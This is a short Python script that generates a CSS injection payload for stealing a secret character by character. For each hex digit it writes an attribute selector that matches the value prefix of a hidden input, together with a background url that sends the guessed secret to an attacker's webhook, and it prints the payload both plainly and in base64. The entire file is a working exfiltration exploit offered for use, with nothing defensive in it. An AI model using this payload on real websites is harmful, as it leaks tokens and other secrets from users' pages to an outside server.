import base64
import os

def generate_attack_vector(known_secret, server):
    secret_params = "0123456789abcdef"
    attack_vector_tmpl = "input[type='hidden'][value^='{known_secret}{try_secret}']{{background: url('http://{server}?secret={known_secret}{try_secret}')}}"

    attack_vector = ""
    for secret_param in secret_params:
        attack_vector += attack_vector_tmpl.format(
            known_secret=known_secret,
            try_secret=secret_param,
            server=server
        )

    return {
        "plain": attack_vector,
        "base64": base64.b64encode(attack_vector.encode())
    }

def main():
    known_secret = input("[Known Secret] > ")
    server = input("[Webhook] (os.environ[\"SERVER\"]) > ")

    server = server if server else os.environ["SERVER"]

    attack_vector = generate_attack_vector(
        known_secret=known_secret, 
        server=server)
    
    print("[Attack Vector]")
    print(attack_vector["plain"])
    print("[Attack Vector (base64)]")
    print(attack_vector["base64"].decode())

if __name__ == '__main__':
    main()